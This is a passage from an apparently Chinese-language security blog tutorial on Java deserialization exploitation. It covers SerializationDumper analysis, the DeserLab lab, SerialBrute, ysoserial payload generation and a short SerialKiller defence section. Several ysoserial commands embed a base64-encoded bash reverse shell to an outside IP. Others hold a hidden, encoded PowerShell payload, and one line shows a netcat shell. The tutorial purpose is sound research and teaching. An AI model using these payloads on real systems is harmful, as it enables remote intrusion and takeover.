+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#58a1dd">$</span> <span style="color:#58a1dd">java</span> <span style="color:#ff636f">-</span><span style="color:#58a1dd">jar</span> <span style="color:#58a1dd">SerializationDumper</span>.<span style="color:#58a1dd">jar</span> <span style="color:#58a1dd">ACED00057708af743f8c1d120cb974000441424344</span>
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">STREAM_MAGIC</span> <span style="color:#ff636f">-</span> <span style="color:#58a1dd">0xac</span> <span style="color:#58a1dd">ed</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">STREAM_VERSION</span> <span style="color:#ff636f">-</span> <span style="color:#58a1dd">0x00</span> <span style="color:#58a1dd">05</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">Contents</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#58a1dd">TC_BLOCKDATA</span> <span style="color:#ff636f">-</span> <span style="color:#58a1dd">0x77</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">Length</span> <span style="color:#ff636f">-</span> <span style="color:#58a1dd">8</span> <span style="color:#ff636f">-</span> <span style="color:#58a1dd">0x08</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">Contents</span> <span style="color:#ff636f">-</span> <span style="color:#58a1dd">0xaf743f8c1d120cb9</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#58a1dd">TC_STRING</span> <span style="color:#ff636f">-</span> <span style="color:#58a1dd">0x74</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">newHandle</span> <span style="color:#58a1dd">0x00</span> <span style="color:#58a1dd">7e</span> <span style="color:#58a1dd">00</span> <span style="color:#58a1dd">00</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">Length</span> <span style="color:#ff636f">-</span> <span style="color:#58a1dd">4</span> <span style="color:#ff636f">-</span> <span style="color:#58a1dd">0x00</span> <span style="color:#58a1dd">04</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">Value</span> <span style="color:#ff636f">-</span> <span style="color:#58a1dd">ABCD</span> <span style="color:#ff636f">-</span> <span style="color:#58a1dd">0x41424344</span></span></span></code></pre></div><p>根据上面的输出结果，我们发现数据流中包含一个TCBLOCKDATA，后面跟着一个TCSTRING，我们可以将TC_STRING替换为我们的攻击payload。</p>
+<p>序列化流中的对象在加载时会被实例化，而不是当整个流完成解析时才会被实例化。根据这个事实，可以将攻击payload注入到某个序列化流中，而不用考虑去矫正序列化流剩余的那些数据。当任何验证操作执行时，或者当程序尝试从序列化流中读取更多数据时，攻击payload的反序列化以及执行操作早已完成。</p>
+<h5 id="实践工具" class="heading-element"><span>0.0.0.2  实践工具</span>
+  <a href="#%e5%ae%9e%e8%b7%b5%e5%b7%a5%e5%85%b7" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p><a href="https://github.com/NickstaDB/DeserLab"target="_blank" rel="external nofollow noopener noreferrer"><strong>DeserLab</strong></a>可以在本地打开具有java反序列化漏洞服务的工具可以模拟创建java反序列化漏洞的场景,使用方法为:</p>
+<pre tabindex="0"><code>首先启动服务器端组件
+java -jar DeserLab.jar -server &lt;listen-address&gt; &lt;listen-port&gt;
+例如: java -jar DeserLab.jar -server 127.0.0.1 6666
+接下来使用客户端与服务端组件交互 java -jar DeserLab.jar -client &lt;server-address&gt; &lt;server-port&gt;</code></pre><p><a href="https://github.com/NickstaDB/SerialBrute/"target="_blank" rel="external nofollow noopener noreferrer"><strong>SerialBrute</strong></a>这个工具可以自动化使用ysoserial payload来测试任何目标</p>
+<pre tabindex="0"><code>第一个脚本为“SerialBrute.py”，可以重放TCP会话或者HTTP请求，
+并且能将payload注入到指定的位置；
+第二个脚本为“SrlBrt.py”，这是一个框架型脚本，
+在特殊情况下我们可以修改这一脚本来发送payload。
+这些脚本并没有考虑全部情况，因此需要谨慎使用，以免导致应用程序崩溃
+ 
+用ysoserial生成针对Groovy库的payload:
+java -jar ysoserial.jar Groovy1 &#34;powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc bQBrAGQAaQByACAAaABhAGMAawBlAGQAXwBiAHkAXwBwAGgA MAByAHMAZQA=&#34;&gt;payload2.bin
+使用生产的payload(python2.7)： python deserlab_exploit.py 127.0.0.1 6666 payload2.bin</code></pre><p><a href="https://github.com/frohoff/ysoserial"target="_blank" rel="external nofollow noopener noreferrer"><strong>ysoserial</strong></a>集成了多条链子可以用于生成payload</p>
+<pre tabindex="0"><code>Usage: java -jar ysoserial-[version]-all.jar [payload] &#39;[command]&#39;
+$ java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections1 &#34;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjExNy4yMy4xNzcvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}&#34; &gt; payload.bin</code></pre><p><a href="https://gist.github.com/DiabloHorn/8630948d953386d2ed575e17f8635ee7?spm=a2c6h.12873639.0.0.136d1658853V5e"target="_blank" rel="external nofollow noopener noreferrer"><strong>deserlab_exploit.py</strong></a>用于测试ysoserial生成的payload</p>
+<pre tabindex="0"><code>$ java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections1 &#34;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjExNy4yMy4xNzcvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}&#34; &gt; payload.bin
+$ java -jar DeserLab.jar -server 127.0.0.1 6666
+$ python deserlab_exploit.py 127.0.0.1 6666 payload.bin</code></pre><p><a href="https://www.jackson-t.ca/runtime-exec-payloads.html"target="_blank" rel="external nofollow noopener noreferrer"><strong>载荷转换工具:</strong></a></p>
+<pre tabindex="0"><code>使用ysoserial命令执行payload时经常需要到网站
+https://www.jackson-t.ca/runtime-exec-payloads.html
+进行负载转换,
+这是因为使用了“java.lang.Runtime.exec(String)”语句，导致命令执行存在限制,
+例如不支持shell操作符，如输出重定向以及管道;
+传递给payload命令的参数中不能包含空格，
+比如，我们可以使用nc -lp 4444 -e /bin/sh但是不能使用perl -e ‘use Socket;…&#39;,
+这是因为传递给perl的参数中包含空格.
+ 
+但是如果使用转换后的负载就不会出现上面的问题
+尝试反序列化的POP链时如果触发无法处理的异常点有可能会导致程序崩溃
+如果使用某个ysoserial  payload时，目标应用的响应为“ClassNotFoundException”，
+这种情况下，很有可能选择的利用点不能用于目标应用。如果目标应用出现“java.io.IOException”，
+同时返回“Cannot run program”信息，那么很有可能选择的利用链适用于目标应用，
+但尝试执行的命令无法在目标服务器上执行。</code></pre><p>ysoserial命令执行payload属于盲payload（blind payloads）类型，不会返回命令的输出结果</p>
+<h5 id="反序列化防护" class="heading-element"><span>0.0.0.3  反序列化防护</span>
+  <a href="#%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e9%98%b2%e6%8a%a4" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p>然后放在classpath，将应用代码中的java.io.ObjectInputStream替换为SerialKiller，之后配置让其能够允许或禁用一些存在问题的类，SerialKiller有Hot-Reload,Whitelisting,Blacklisting几个特性，控制了外部输入反序列化后的可信类型。</p></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="Updated on 2024-08-15 10:15:01">Updated on 2024-08-15&nbsp;</span>
+      </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span></span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-tag" title="Tags - 代码审计">代码审计</a><a href="/tags/java%E5%AE%89%E5%85%A8/" class="post-tag" title="Tags - Java安全">Java安全</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"><a href="/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/java%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/16/" class="post-nav-item" rel="prev" title="Java Log4j"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>Java Log4j</a>
+      <a href="/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/java%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/10/" class="post-nav-item" rel="next" title="URLDNS链">URLDNS链<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.132.1">Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.9">FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2024</span><span class="author" itemprop="copyrightHolder">
+              <a href="/">东隅</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
+        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
+    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/instant-page/instantpage.min.js" async defer type="module"></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":20},"comment":{"enable":false},"typeit":{"cursorChar":"_","cursorSpeed":1000,"duration":-1,"loop":false,"speed":100},"version":"v0.3.9"};</script><script src="/js/theme.min.js" defer></script><script>
+      window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
+      gtag('config', 'G-YMSM8DYT3D', { 'anonymize_ip': true });
+    </script><script src="https://www.googletagmanager.com/gtag/js?id=G-YMSM8DYT3D" async></script></body>
+</html>
